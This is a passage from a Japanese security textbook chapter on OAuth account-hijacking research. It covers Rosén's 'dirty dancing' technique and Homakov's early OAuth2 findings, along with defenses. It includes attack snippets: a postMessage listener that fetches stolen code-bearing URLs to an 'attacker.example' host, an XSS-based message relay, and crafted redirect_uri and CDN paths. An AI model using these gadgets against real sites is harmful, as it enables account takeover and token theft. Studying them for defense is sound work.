# 第3章 公開ライトアップと実際のバグバウンティ事例

## Frans Rosén「dirty dancing」— postMessage 経由のコード/トークン漏洩

### この節で学ぶこと

OAuth の「認可コード横取り（account hijacking）」は、2012〜2013年ごろの Egor Homakov や Nir Goldshlager の研究以来、繰り返し議論されてきた古典的テーマです。しかし CSP（Content Security Policy）やブラウザの XSS Auditor、`postMessage` の origin 検証といった防御が普及した結果、多くの開発者は「もう安全」と思い込むようになりました。Frans Rosén（Detectify）の2022年の研究「Account hijacking using "dirty dancing" in sign-in OAuth-flows」は、この思い込みを打ち破り、**正規のログイン成功パス（happy path）ではなく、あえて OAuth フローを"途中で失敗させる"（非happy path）ことで、認可コードやトークンを URL に残留させ、それを `postMessage` などのブラウザ内ガジェットで盗み出す**という一連の手口を体系化しました。

本節では、この「dirty dancing（きわどいダンス）」がなぜ成立するのかを、OAuth のレスポンス種別・レスポンスモードの仕様レベルから、`postMessage` リスナーの実装バグまで、仕組みに踏み込んで解説します。

> ⚠️ **スコープの確認**: 本節は防御・検知の理解を目的として攻撃原理を説明します。実在するサービスや本番環境への無許可の検証は行わないでください。掲載するコードは「なぜ漏洩が起きるか」を理解するための最小の説明用断片です。

---

### なぜ「途中で失敗させる」と漏洩するのか — 前提となる直感

まず攻撃の全体像をつかみます。通常、被害者が正規サイトで「Google でログイン」を押すと、以下が起きます。

1. 正規サイトが認可サーバ（Google など）へ被害者を送る。
2. 被害者が同意（または既にセッションがあれば即座）。
3. 認可サーバが `code`（認可コード）や `token`（アクセストークン）を付けて、**正規サイトの `redirect_uri`** へ被害者を戻す。
4. 正規サイトのサーバがその `code` を受け取り、裏側でトークンに交換してログイン完了。

この「happy path」では、`code` は正規サイトのコールバックページに一瞬現れるだけで、すぐに消費（サーバサイドでトークン交換）されます。攻撃者が割り込む隙はほとんどありません。

「dirty dancing」の発想は、**この4のステップを"正常に完了させない"** ことです。たとえば `state`（後述）をわざと不正にすれば、正規サイトは「不正なリクエストだ」としてエラーページを表示します。ところが、そのエラーページの URL には **まだ `code` が残ったまま**であることが多い。もしそのエラーページ（あるいはコールバック直後のページ）に、origin 検証の甘い `postMessage` リスナーや、サードパーティ JavaScript（Google Tag Manager、チャットウィジェット、解析SDKなど）が読み込まれていれば、攻撃者はそれを"ガジェット"として悪用し、URL に残った `code`/`token` を自分のオリジンへ盗み出せます。

つまり dirty dancing は、次の2つの独立した要素を**連鎖（chain）** させる攻撃です。

- **(A) トークン/コードを URL に残留させる手口**（レスポンス種別/モードの切り替え、`state` の破壊、`redirect_uri` の細工）
- **(B) URL に残ったものをクロスオリジンで盗み出すガジェット**（弱い `postMessage` リスナー、サンドボックスドメインの XSS、帯域外のデータ漏洩経路）

以下、それぞれを詳しく見ます。

---

### 前提知識の整理: レスポンス種別（response_type）とレスポンスモード（response_mode）

dirty dancing を理解するには、OAuth/OpenID Connect の「何を返すか（response_type）」と「どこに返すか（response_mode）」の区別が要です。

#### response_type — 何が返るか

- **`code`**: 認可コード。単体では使えず、サーバがクライアントシークレット（や PKCE の `code_verifier`）と合わせてトークンに交換する必要がある。通常 `state` とセット。
- **`id_token`**: OpenID Connect の ID トークン。認可サーバが署名した JWT。
- **`token`**: アクセストークン本体。**URL に露出した瞬間に即悪用できる**ため最も危険。
- これらは `code id_token`、`code token` のように**組み合わせ**も可能（ハイブリッドフロー）。

#### response_mode — どこに（どの形式で）返るか

- **`query`**: `?code=...&state=...` のように URL のクエリ文字列に入る。サーバのアクセスログにも残る。仕様上 `token` を query で返すのは非推奨。
- **`fragment`**: `#access_token=...` のように URL のフラグメント（`#` 以降）に入る。フラグメントはブラウザからサーバへ送信されないため、`token` の配送に使われる。
- **`web_message`**: 認可サーバのページが `postMessage` で固定オリジンへ結果を送る方式（Auth0 等が採用）。
- **`form_post`**: 結果を `POST` ボディとしてサイトへ送り返す。

ここで攻撃者が狙うのは、**サイト（クライアント）が想定しているモードと違うモードを認可サーバに要求できてしまう**という設定不備です。たとえばサイトは `response_type=code`（query）でコールバックを処理する実装なのに、攻撃者がログイン開始 URL を書き換えて `response_type=code id_token`（fragment 配送）を要求できると、サイトのサーバは fragment を読めない（サーバに送られない）ため処理に失敗し、`code`/`id_token` がブラウザ側の URL に残ります。

> 出典: Frans Rosén "Account hijacking using 'dirty dancing' in sign-in OAuth-flows" — https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/

---

### (A) トークン/コードを URL に残留させる5つの手口

Frans Rosén は「OAuth のダンスを崩す」非happy path を、次のように分類しました。

#### 1. 不正な state パラメータ（Invalid State）

`state` は「このコールバックは、確かに自分（正規サイト）が開始したログインの応答である」ことを保証するための、CSRF 対策用のランダム値です。サイトはログイン開始時に `state` を生成してセッションに保存し、コールバックで一致を確認します。

攻撃の流れ:

1. 攻撃者は**自分の環境で正規サイトにログイン開始**し、正規サイトが発行した有効な `state`（例: `STATE_ATT`）を手に入れる。
2. 攻撃者は被害者に踏ませるリンクを、`...&state=STATE_ATT` のように**攻撃者の state を仕込んで**作る。
3. 被害者がそのリンクを踏むと、被害者のブラウザで認可サーバが `code`（被害者の認可コード）を付けて `redirect_uri` に戻す。
4. しかしサイトは、被害者のセッションに保存した `state` と `STATE_ATT` が**一致しない**ためエラー扱いにする。
5. その結果、**エラーページの URL に被害者の `code` が残る**。
6. 攻撃者はガジェット（後述の (B)）でこの `code` を盗み、**自分側の `state`（と PKCE の対応する `code_verifier`）** で正規のフローを完了させ、被害者アカウントに成りすます。

**なぜ PKCE でも防げないのか**: PKCE（Proof Key for Code Exchange）は、ログイン開始時に `code_verifier`（ランダム秘密）を作り、そのハッシュ `code_challenge` を認可サーバに登録し、トークン交換時に `code_verifier` を提示させる仕組みです。「コードだけ盗んでも `code_verifier` がないと交換できない」ため強力に見えます。しかし dirty dancing では**攻撃者自身がフローを開始する**ため、攻撃者は自分の `code_challenge`/`code_verifier` のペアを用意でき、被害者の `code` はその攻撃者側チャレンジに紐づいた形で得られます。よって攻撃者は自分の `code_verifier` で交換できてしまい、PKCE は突破されます。ここは「PKCE を入れたから安心」という思い込みを崩す重要点です。

#### 2. レスポンス種別/モードの切り替え（Response-Type/Mode Switching）

前述の通り、サイトが `code`（query）で処理する前提なのに、攻撃者がログイン開始 URL を `response_type=code id_token` などに書き換えると、配送先が fragment に変わり、サーバが読めず URL に残留します。

記事では具体例として **Apple のサインイン**が挙げられています。Apple は本来 `response_mode=query` を使いますが、これを `fragment` に切り替えると、認証情報の出現位置がクエリからフラグメントへ移動します。想定と違うモードで返ることで、クライアント側の処理が破綻し、値が URL に取り残されます。

```
# サイトが想定する開始リクエスト（例）
https://appleid.apple.com/auth/authorize?...&response_type=code&response_mode=query

# 攻撃者が書き換えた開始リクエスト（例）
https://appleid.apple.com/auth/authorize?...&response_type=code&response_mode=fragment
```

**なぜ成立するか**: 認可サーバが、そのクライアントに対して許可するレスポンス種別/モードを**厳密に固定していない**（複数を許容している）と、攻撃者がクライアント登録の意図と異なるモードを"注文"できてしまうためです。

#### 3. redirect_uri のケースシフト（大文字小文字ずらし）

OAuth 仕様では `redirect_uri` は**完全一致**で検証すべきですが、一部プロバイダはパス部分を**大文字小文字を区別せず**照合してしまいます。

```
# 登録された正規のコールバック
https://example.com/callback

# 攻撃者が使う変形（一部プロバイダは同一とみなす）
https://example.com/CaLLbaCk
```

**なぜ漏洩に繋がるか**: 認可サーバは「一致した」とみなして `code`/`token` を返しますが、**サイト側のルーティングは `/CaLLbaCk` を正規のコールバックハンドラに解決しない**ことがあります。すると 404 やデフォルトのエラーページに着地し、そのページに `code` が残ったまま、かつ（コールバックと違って）サードパーティスクリプトが読み込まれている、という危険な組み合わせが生まれます。

#### 4. redirect_uri へのパス/パラメータ追記（Path/Parameter Appending）

一部プロバイダは、登録済み `redirect_uri` への**末尾追記**を許してしまいます。

```
# 例: パラメータをエンコードして追記
redirect_uri=https://example.com/callback%3Fcode=xxx%26
```

`%3F` は `?`、`%26` は `&` のエンコードです。これにより、返される URL に**重複したパラメータや不正な形の URL**が生まれ、サイトの処理が壊れる（＝正常消費されず URL に残る）一方で、認証情報は保持されます。パス追記（`/callback/x` など）でも同様に、ハンドラへの解決が外れてエラーページ着地→残留、という結果になります。

#### 5. redirect_uri の設定ミス（開始ページ自体が redirect_uri に登録）

Frans Rosén は **125個の Google サインインフロー**を調査し、そのうち **5サイト**が「ログイン開始ページ（スタートページ）そのもの」を有効な `redirect_uri` として登録していた、と報告しています。この設定だと、認可サーバはトークンを"予期しないエンドポイント（開始ページ）"へ配送でき、そこにコールバック処理が無いため値が残留します。

> 出典: Frans Rosén "Account hijacking using 'dirty dancing' in sign-in OAuth-flows" — https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/

---

### (B) URL に残った値を盗み出す「ガジェット」

残留させただけでは攻撃は完成しません。攻撃者は自分のオリジン（悪性ページ）から、被害者のタブに残った `code`/`token` を読む必要があります。ブラウザの同一オリジンポリシーがあるため、通常は他オリジンの URL を直接読めません。そこで、正規サイト（や連携サードパーティ）の中に潜む**弱いブラウザ内メッセージング機構**を"梃子（ガジェット）"にします。

#### ガジェット1: 弱い postMessage リスナー

`postMessage` は、異なるオリジンの window（別タブや iframe）間でメッセージを送るブラウザ API です。**受信側は必ず `event.origin` を検証すべき**ですが、これを怠り「誰からのメッセージでも応答する」実装が、サードパーティ SDK に紛れ込んでいることがあります。

典型的には、SDK が「今いるページの URL（`location.href`）」を問い合わせに応じて返すような実装です。

```javascript
// 攻撃者ページ（悪性オリジン）側のコード
// window.open で被害者のタブ（残留 code を含む URL）を開く／参照を持つ
var openedwindow = window.open('https://www.example.com');

// origin 検証の甘い SDK リスナーに問い合わせを投げる（宛先 '*' = 任意オリジン）
openedwindow.postMessage('{"type":"sdk-load-embed"}', '*');

// SDK が「現在の location.href」を返信 → その中に ?code=... が入っている
window.addEventListener('message', function(e) {
  // e.data に被害者の URL（= code/token 付き）が届く
  fetch('https://attacker.example/leak?d=' + encodeURIComponent(e.data));
});
```

**なぜ成立するか**: `postMessage` の宛先に `'*'`（任意オリジン）を使うと、メッセージは指定なしで届きます。さらに**受信側 SDK が `event.origin` を確認せず**、要求に応じて機微情報（現在 URL）を返信してしまうと、攻撃者オリジンへ堂々とデータが渡ります。攻撃者は事前に (A) の手口で `code` を URL に残らせておき、このガジェットで回収します。

#### ガジェット2: サンドボックスドメイン上の XSS

サイトが「サンドボックス用（信頼しないコンテンツ表示用）」のサブドメインや iframe を持ち、そこに XSS があると、攻撃者はその内側から親/オープナー window を操作してデータを引き出せます。記事は2つの変種を示します。

**変種2A: `window.name` を使った持ち出し**

`window.name` は**ページ遷移をまたいで保持される**特殊なプロパティで、しかもクロスオリジンでも（一定の条件で）読み書きの経路になり得ます。親が iframe の `name` に機微データを詰め、その iframe 内で XSS が動くと、`window.name` 経由で吸い出せます。

```javascript
// 親（正規側）が iframe の name に window.location（= URL）を詰めてしまう例
var i = document.createElement('iframe');
i.name = JSON.stringify(window.location);      // ここに code/token 付き URL が入る
i.srcdoc = '<script>window.parent.postMessage(window.name, "*")<\/script>';

// 攻撃者はサンドボックスドメインの XSS からフレーム階層を辿り、name を読む
// 例: b.frames[0].window.name → 完全な URL（トークン入り）
```

**変種2B: XSS 経由の postMessage プロキシ**

サンドボックスオリジンで攻撃者が任意 JS を実行できると、その"信頼されたオリジン"を中継役にして、本来届かないメッセージを転送するプロキシを作れます。

```javascript
// 攻撃者がサンドボックスオリジンのフレームに仕込む中継コード
b.frames[1].eval(
  'onmessage=function(e){ top.opener.postMessage(e.data,"*") };' +  // 受けた物を opener へ横流し
  'top.postMessage({type:"initConfig"},"*")'                        // 上位に初期化を要求
);
// parent / opener の関係を辿ってデータを攻撃者へ漏らす
```

**なぜ成立するか**: `postMessage` の origin 検証がサイト全体で一貫していないと、"信頼できるオリジンから来たメッセージ"として素通りする経路が生まれます。攻撃者はサンドボックスドメインの XSS でその信頼を借用し、中継ノードを作って機微データを最終的に自オリジンへ運びます。

#### ガジェット3: 帯域外（out-of-band）のデータ漏洩

サードパーティのインフラ（解析ストレージ、CDN、チャットウィジェット）の設計不備を突く経路です。

**変種3A: 解析ストレージ iframe（origin 許可リストなし）**

複数サイトで共有される「同期用ストレージ iframe」が、`postMessage` の origin を検証せず購読を受け付けると、被害者の URL がストレージに書かれた瞬間に、購読している攻撃者へブロードキャストされます。

```javascript
// 脆弱な同期 iframe（origin 検証が甘い例）
window.addEventListener('message', function(e) {
  if (e.source !== window.parent) return;          // 親かどうかだけ確認（origin は未検証）
  if (e.data.type === 'sync') {
    syncListeners.push({ source: e.source, origin: e.origin });  // 誰でも購読可能
  }
});

// ストレージ更新（例: 被害者 URL が保存される）を全購読者へ配る
window.addEventListener('storage', function(e) {
  syncListeners.forEach(function(l) {
    l.source.postMessage({ type: 'sync', key: e.key, value: e.newValue }, l.origin);
  });
});
```

攻撃者はこのストレージ iframe を**自分のページの子として埋め込み**、同期購読を登録。被害者側でトークン入り URL が保存されると、その値が攻撃者へも配送されます。

**変種3B: S3/CDN の URL エンコード差異による XSS**

Amazon S3 はパス中の `/` と `%2f` を同一視することがあります。ここで「`/img/` パスには CSP ヘッダが付くが、`img%2f` には付かない」という設定差があると、CSP を回避して別顧客のオリジンで JS を実行できます。

```
# 顧客Aのオリジンで、顧客Bのバケットにアップした悪性 SVG を実行
https://cdn.customer-A.analytics.com/img%2fcustomer-B/xss.svg
```

**なぜ成立するか**: パス正規化（`%2f` の解釈）の食い違いにより、CSP を付与するルールにマッチしないパスで同一ファイルへ到達できてしまう。攻撃者は公開バケットに XSS を含む SVG を置き、別顧客のサブドメイン経由で読み込ませて、そのオリジンで JS を実行→origin 無検証の postMessage プロキシを構築します。

**変種3C: チャットウィジェット API**

チャットウィジェットの iframe が、origin 検証なしに親へ API トークンを渡すと、攻撃者はチャット起動をトリガーしてそのトークンを読み取り、被害者の `current_page`（トークン入り URL を含む）を API から取得できます。記事では、サーバサイドリクエストで `Origin` ヘッダを人工的に付けてチャット API をポーリングし、被害者セッションの情報を再構成する、という流れが説明されています。

> 出典: Frans Rosén "Account hijacking using 'dirty dancing' in sign-in OAuth-flows" — https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/

---

### 攻撃の全体像（連鎖のまとめ）

dirty dancing は「(A) 残留 × (B) 漏洩ガジェット」の掛け算です。1クリックのアカウント乗っ取り（single-click account takeover）が成立する典型シナリオは次の通りです。

1. 攻撃者が自分の環境でログインを開始し、有効な `state` と PKCE ペアを用意する（1.）。
2. 攻撃者が `state` 差し替え／レスポンスモード切替／`redirect_uri` 細工を仕込んだログイン URL を作る（A）。
3. 被害者がその1本のリンクをクリック。被害者のブラウザで `code` が発行されるが、`state` 不一致等でエラーページ着地→**URL に `code` 残留**。
4. そのエラーページ/コールバック周辺に読み込まれた弱い postMessage リスナーやサードパーティ SDK（B）を使い、攻撃者オリジンが `code` を回収。
5. 攻撃者は自分の `state`／`code_verifier` で正規フローを完了させ、被害者アカウントに成りすます。

被害者の操作は「1回のクリック」だけで、以降のトークン窃取は自動化されます。攻撃者ページが被害者タブを制御し、クロスオリジンで機微情報を吸い出す点が本質です。

---

### 未取得資料の扱い（Speaker Deck スライド）

本節の元となったスライド（Speaker Deck）については WebFetch でテキスト抽出に成功し、記事本文と同一の主張（レスポンス種別/モード切替、`redirect_uri` の変形、`state` 検証破り、弱い postMessage リスナー、サードパーティドメインの XSS、API 列挙、そして「OAuth ダンスに関わるエラーページにサードパーティスクリプトを載せない」という中心的防御）を確認できました。特に強調されていた実務メッセージは以下です。

- 「OAuth ダンスに関わるエラーページにサードパーティスクリプトを含めるな（Do NOT include third party scripts on error pages involved in the OAuth-dance）」
- 非happy path を必ずテストし、GTM（Google Tag Manager）などのタグが OAuth フロー中に読み込まれていないか検証せよ
- `state` を厳格に検証せよ
- プロバイダ側は、使わないレスポンスモード/種別を無効化できるようにし、`redirect_uri` 検証をより厳格に、レスポンスモードのピン留め（固定）を実装せよ

> 出典: Frans Rosén "Account hijacking using 'dirty dancing' in sign-in OAuth-flows"（スライド） — https://speakerdeck.com/fransrosen/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows

---

### 影響（Impact）

- **1クリックのアカウント乗っ取り**: 被害者はリンクを踏むだけ。以降は自動。
- **クロスオリジンでの被害者タブ制御**: 攻撃者ページが被害者の window を操作。
- **持続性**: OAuth プロバイダが発行した認証情報の性質上、条件が揃えば長期間にわたり悪用余地が残る。
- **PKCE を入れていても防げない**ケースがある（攻撃者がフローを開始する構造のため）。

---

### 防御（Defenses / Mitigations）

本研究の最大の教訓は、**OAuth のコールバックとエラーページを"清浄地帯（clean room）"に保て**、という点です。

#### OAuth クライアント（サイト）側

- **サードパーティスクリプトを OAuth 経路から排除する**。仕様の精神として「認可レスポンスの結果として描画されるページ（および認可エンドポイント）は、サードパーティのリソースや外部サイトへのリンクを含むべきでない（SHOULD NOT）」。これは**エラーページも含む**。
- **`state` を、`code` を消費する前に必ず検証する**。不一致なら `code` を含む URL を即座に無害化（リダイレクトで除去等）する。
- **対応するレスポンス種別/モードをプロバイダ設定で絞る**（想定外の `id_token`/`token`/fragment を受け付けない）。
- **プロバイダの `redirect_uri` 検証を過信しない**。自サイト側でもコールバックのパス/クエリを厳格に扱う。
- **非happy path（失敗系）を必ずテストする**。GTM やチャット、解析 SDK が OAuth フロー中に読み込まれていないか確認する。

#### OAuth プロバイダ側

- **`redirect_uri` を厳密な完全一致で検証する**（大文字小文字を区別、末尾追記を不許可）。
- **すべてのレスポンス種別で、最終的なトークン発行時に `redirect_uri` を検証する**。
- **アプリごとに使用可能なレスポンス種別/モードを制限**できるようにし、使わないモードは無効化可能にする（レスポンスモードのピン留め）。
- 各レスポンスモードのセキュリティ上の含意をドキュメント化する。

#### 一般的な多層防御

- **送信者制約付きアクセストークン（Sender-Constrained Access Tokens、mTLS など）** を使い、万一トークンが漏れても他者が使えないようにする。
- **CSP（Content Security Policy）** で postMessage ガジェットや不要な外部スクリプトの実行余地を狭める。
- サイトへのサードパーティスクリプト追加（GTM 経由の変更など）を監視する。
- OAuth ダンスに関わる**全ページ（エラー経路を含む）を棚卸し**して監査する。

---

### まとめ — 「happy path しか見ない」ことの危険

dirty dancing が突いたのは、技術的な単一のバグというより、**開発者の心理的死角**です。「CSP も PKCE も postMessage の origin 検証もある、だからもう安全」という前提のもとで、誰も「わざと失敗させたときのエラーページ」を見ていない。そこにサードパーティスクリプトがぶら下がり、URL に `code` が残る。攻撃者はその2つを繋ぐだけで1クリック乗っ取りに至ります。

教訓は明快です。**OAuth の安全性は happy path だけでなく、あらゆる失敗系（非happy path）と、そこに載っているすべてのサードパーティコードを含めて評価しなければならない**。認可コード/トークンが一瞬でも留まる URL は、それがエラーページであっても"機密"として扱う、というのが本研究の核心的な設計原則です。

> 出典: Frans Rosén "Account hijacking using 'dirty dancing' in sign-in OAuth-flows"（Detectify Labs） — https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/

## Egor Homakov の古典研究（2012〜2013、歴史的攻撃原理）

OAuth2 のセキュリティ史を語るうえで、Egor Homakov（エゴール・ホマコフ）が2012〜2013年に公開した一連のブログ記事は避けて通れない。彼はこの時期、Facebook・VKontakte など実在サービスに対する検証を通じて、OAuth2 仕様が「フレームワーク（実装依存）」であるがゆえに生まれる構造的な脆弱性のパターンを次々と明らかにした。これらは特定のサービスの単発バグではなく、**redirect_uri 検証・response_type の扱い・アクセストークンの発行元検証**という、OAuth2 実装全般に共通する3つの弱点を象徴している。本節では、これら3本の記事を通じて「なぜOAuth2はここまで壊れやすかったのか」を仕組みレベルで理解する。

なお、ここで紹介する内容は2012〜2013年当時のFacebook・VKontakte・Chromeの実装に基づく歴史的記録であり、記載された欠陥はすべて当時のうちに修正済みである（本文中に修正内容を明記する）。現在のOAuth2実装（OAuth 2.1草案やPKCE必須化以降）を評価する材料としてではなく、「なぜこうした設計原則が必要になったのか」という原理を学ぶための教材として読んでほしい。

### 3-B-1. OAuth2 「One access_token To Rule Them All」（2012年8月）

#### 攻撃の全体像

この記事は、Implicit Flow（インプリシットフロー。認可コードを経由せず、リダイレクトURLのフラグメント部分に直接アクセストークンを載せて返す方式）を使うサイト同士の間で、**あるサイト向けに発行されたアクセストークンが、別のサイトへのなりすましログインに転用できてしまう**という脆弱性を示した。

Homakov が示したシナリオは次のようなものだ。

1. 攻撃者が「superfunnypicturez.com」という無害そうなサイトを作り、Facebookログインを実装する。要求するスコープは最小限（`/me` エンドポイントが読める程度）にとどめる。ユーザーは「大したことは許可していない」と油断して認可してしまう。
2. この認可によって、Facebook は攻撃者のクライアント（superfunnypicturez.com）宛てにアクセストークンを発行する。ここで重要なのは、**攻撃者はこのとき「被害者本人のアクセストークン」を手に入れている**ということだ。トークン自体は正規に発行されたものであり、盗んだわけではない。
3. 一方、別のサイト「weuseimplicitflow.com」もImplicit Flowでログイン機能を実装しているが、コールバックURLのフラグメントに載って戻ってきたアクセストークンを**それがどのクライアント向けに発行されたものかを検証せずに**そのまま信用してしまう。
4. 攻撃者は自分の手元にある被害者のアクセストークンを、weuseimplicitflow.com のコールバックURLに直接埋め込む。

```
https://weuseimplicitflow.com/callback#access_token=(被害者のアクセストークン)
```

5. weuseimplicitflow.com はこのトークンを使って Facebook の `/me` エンドポイントを叩き、返ってきたUID（被害者のID）でログインセッションを確立してしまう。結果、攻撃者はブラウザを操作しているだけで、被害者本人としてweuseimplicitflow.comにログインできてしまう。

#### なぜこの攻撃が成立するのか（仕組みレベル）

この攻撃の核心は、「アクセストークンという文字列そのものには、それが**どのクライアントID向けに発行されたか**という情報が（デフォルトでは）含まれていない」という設計にある。OAuth2の認可サーバーは、あるクライアントに対してトークンを発行する際、内部的には「このトークンはclient_id=Xに対して発行した」という対応関係を保持している。しかし、そのトークンを受け取った**別のクライアント（サイト）が独自にそれを検証する手段**を、Implicit Flowを素朴に実装しただけでは持てない。

つまり脆弱なのは「Facebookのトークン発行ロジック」ではなく、**トークンを受け取る側（Relying Party）が「このトークンは本当に自分向けに発行されたものか」を確認せずに認証情報として使ってしまう実装パターン**である。これは俗に「トークン置き換え攻撃（token substitution / audience confusion）」と呼ばれるクラスの脆弱性で、後年のOpenID Connectでは `aud`（audience）クレームや `id_token` の署名検証で構造的に対処されることになる欠陥の、いわば原型である。

Homakov はこの問題を次のように端的に表現している。

> 「アクセストークンさえあれば、他のパラメータは不要」という設計そのものが問題である

これは、トークンという単一の文字列に「これは誰の、どのアプリ向けの認可か」という文脈情報が欠落したまま流通してしまう、Implicit Flowのアーキテクチャ上の欠陥を突いている。

#### 修正方法として提示された対策

記事でHomakovが挙げた具体的な緩和策は以下の通り。

- **Implicit Flowを使う場合**: コールバックで受け取ったアクセストークンをそのまま信用せず、必ず認可サーバーの「トークン検証エンドポイント」に問い合わせて、そのトークンが自分のクライアントID向けに発行されたものかを確認する。Facebookの例では次のようなエンドポイントが挙げられている。

```
https://graph.facebook.com/app?fields=id&access_token=TOKEN
```

このエンドポイントはトークンに紐づくアプリ（client_id）の情報を返すため、レシーバー側は「このトークンは本当に自分のアプリ向けか」を照合できる。

- **認可コードフロー（Authorization Code Flow）を使う場合**: `state` パラメータを用いたCSRF対策を必須化し、認可リクエスト時にセッションへ保存した値と、コールバックで返ってきた値を必ず照合する。
- **根本的な解決策**: OpenID ConnectのようなID連携専用の仕組みや、署名付きリクエスト（signed request）機構の採用。Homakov自身はこの時期、独自に「OAuth2.a」という改善案を提唱していた。

#### なぜこれが「教科書的」な事例なのか

この脆弱性が重要なのは、バグバウンティの文脈で頻出する「OAuthログインの認証バイパス（OAuth Account Takeover）」の**原理そのもの**を提示しているからである。現代のバグハンティングでも、「あるサービス向けに取得したソーシャルログインのトークン/コードを、別のサービスのログインに流用できないか」という視点は、OAuth実装診断における基本チェック項目の一つであり続けている。

> 出典: Egor Homakov「OAuth2: One access_token To Rule Them All」 — http://homakov.blogspot.com/2012/08/oauth2-one-accesstoken-to-rule-them-all.html

### 3-B-2. 「OAuth1, OAuth2, OAuth...?」（2013年3月）

#### OAuth1とOAuth2、何が根本的に違うのか

この記事でHomakovは、OAuth1とOAuth2の設計思想の違いを痛烈に対比させている。OAuth1はリクエストごとに秘密鍵で署名を計算する**署名ベース**のプロトコルであり、通信経路上でパラメータが改ざんされれば署名検証で弾かれる。一方OAuth2はTLS(HTTPS)による通信路の保護を前提に、**トークンを渡すだけ**のシンプルな設計に倒した。この単純化が実装者の自由度を上げた反面、「仕様がフレームワーク止まりで、具体的な検証ロジックを実装者に丸投げしている」ことが多数の脆弱性を生んだ、というのがHomakovの主張の骨子である。

> 「OAuth1 is a straight, concise, explicit and secure protocol. OAuth2 is the road to hell.」

この記事では、実際にHomakovがバグバウンティや監査で発見した具体的な悪用ベクトルが列挙されている。それぞれを仕組みレベルで見ていく。

#### ベクトル1: response_type パラメータの改ざん

OAuth2の認可リクエストでは、クライアントがどの種類のレスポンス（認可コードか、アクセストークン直接か）を望むかを `response_type` パラメータで指定する。

```
GET /authorize?client_id=xxx&response_type=code&redirect_uri=https://client.example/callback
```

正規のクライアントは `response_type=code`（Authorization Code Flow、コードを経由する安全な方式）を使うつもりでも、この値はURLの一部としてブラウザ経由で送られてくるため、**攻撃者が被害者のブラウザを誘導するリンクの中で自由に書き換えられる**。

```
GET /authorize?client_id=xxx&response_type=token&redirect_uri=https://client.example/callback
```

もし認可サーバー側が「このclient_idはresponse_type=codeしか使わないはずだ」という制約をclient_idごとに固定していなければ、`response_type=token`（Implicit Flow）に切り替えられてしまう。すると、認可コードの代わりに**アクセストークンそのものがURLフラグメントに載って返ってくる**。フラグメント（`#`以降）はブラウザからサーバーに送信されない部分だが、リダイレクト先のページ内のJavaScriptがリンククリックや外部スクリプトの読み込みなどを経由して、referrerヘッダーやhistory経由で漏洩する経路が存在すれば、そこからトークンを盗み出せる。

Homakov の指摘は明快である。

> 「盗まれたaccess_token = ゲームオーバー」

対策として提示されているのは、**認可サーバー側でclient_idごとに許可するresponse_typeを事前登録し、リクエストパラメータでの上書きを許さない**という設計だ。つまり「クライアントが何を要求してきたか」ではなく「そのクライアントとして事前に登録された設定は何か」を信頼の基準にする、という原則である。

#### ベクトル2: redirect_uri 検証不備（VKontakteの事例）

VKontakte（ロシアのSNS）では、認可コード取得時に `redirect_uri` の検証が行われていなかった。これにより次のような攻撃チェーンが成立する。

1. 攻撃者は正規のclient_idを使いつつ、`redirect_uri` に自分の管理するサイトを指定した認可URLを被害者に踏ませる。
2. 被害者が認可すると、認可コードが攻撃者のサイトに送られてくる。
3. 攻撃者はこの認可コードを使って、トークンエンドポイントでアクセストークンに交換する。トークンエンドポイントでも `redirect_uri` の一致確認が行われていなければ、そのまま被害者のトークンを取得できる。

さらに、記事ではこれを応用したより巧妙な手口も紹介されている。クライアント側のサイトに埋め込まれた `<img>` タグのURL（画像の遅延読み込み先）に認可コードを含めておくと、画像リクエスト時の `Referer` ヘッダー経由でコードが第三者サーバーに漏洩し、その漏洩したコードを攻撃者が使って被害者としてログインする、という手口も成立し得ることが示されている。

対策は「認可リクエスト時と、トークン交換時の両方で、`redirect_uri` を事前登録済みの値と厳密一致（またはそれに準ずる厳格なルール）で検証する」ことに尽きる。この教訓は現在のOAuth2仕様・セキュリティベストプラクティス（RFC 9700など）で「redirect_uriの完全一致検証」として明文化されている原則の起源の一つである。

#### ベクトル3: state パラメータ省略によるCSRF/セッション固定

OAuth2仕様上、CSRF対策用の `state` パラメータはオプション扱いであり、必須ではない（少なくとも仕様上そう読める）。Homakov はこれを突いて、**認証目的でOAuth2を使う実装**に対するセッション固定・アカウント乗っ取りのシナリオを提示している。`state` を使わない、または攻撃者が用意した認可レスポンスをそのまま自分のセッションに紐づけてログインさせてしまう実装では、「Alice が Mallory としてログインさせられる」といった認証の主体取り違えが起きる。これは典型的な**認証(Authentication)と認可(Authorization)の混同**が根本原因であり、OAuth2はもともと「第三者にAPIアクセスを認可する」ためのプロトコルであって「本人確認(ログイン)」のためのプロトコルではない、という設計上のミスマッチをHomakovは強調している。

#### ベクトル4: 414エラーとstate固定を組み合わせた盗用

より技巧的な手口として、`state` パラメータに極端に長い文字列（記事内では5000文字程度)を入れてリクエストを送り、サーバー側でHTTP 414（URI Too Long）エラーを誘発させる手法が紹介されている。これにより認可コードが本来のクライアント側で消費（使用）されないまま残ってしまい、攻撃者がその未消費のコードを別経路で盗んで再利用できる、という隙が生まれる。対策として、Homakovは**認可コードを一度使用したら即座に無効化する（ワンタイム性の徹底）**ことと、**state用のクッキーも使用後に確実に破棄する**ことを挙げている。

#### ベクトル5: 類似名フィッシング

技術的な脆弱性ではないが、Homakovは「Skype」という正規アプリ名に対して「Skype App」のような紛らわしい名前の第三者アプリを登録できてしまう問題にも触れている。ユーザーは認可画面に表示されるアプリ名だけを見て信頼してしまうため、フィッシングに悪用され得る。対策として「Verified Clients」のようなバッジ表示や、利用者数の明示などUI/UX面での防御が提案されている。

#### refresh_token に対する批判

Homakovはさらに、`refresh_token`（アクセストークンの有効期限が切れた際に新しいアクセストークンを取得するための長寿命トークン）の設計にも疑問を投げかけている。「なぜ `access_token` とクライアント資格情報(client credentials)だけで新しいアクセストークンを取得できるようにしないのか」という問いを立て、`refresh_token` は実質的に `access_token` と同等の価値を持つ秘密情報でありながら、しばしば取り扱いの厳重さがアクセストークンほど意識されない点を批判している。

#### 著者の結論と「OAuth2.a」提案

Homakovは記事の結びで、OAuth2が「プロトコルではなくフレームワークだ」と言い張ることで、本来仕様が定めるべき検証ロジックの多くを実装者任せにしている点こそが根本的な設計不備であると総括している。彼の改善提案（OAuth2.a）の骨子は以下の通りである。

